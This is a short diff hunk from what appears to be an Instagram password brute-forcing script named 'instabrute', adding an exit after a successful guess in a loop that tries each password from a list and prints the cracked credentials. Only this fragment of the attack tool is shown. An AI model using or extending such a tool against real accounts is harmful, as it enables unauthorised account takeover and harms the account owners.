@@ -154,6 +154,7 @@ for password in instabrute.passwords:
 	sess = instabrute.Login(password)
 	if sess:
 		print ('[*] Login success %s' % [instabrute.username,password])
+		exit()
 	else:
 		print ('[*] Password incorrect [%s]' % password)
 
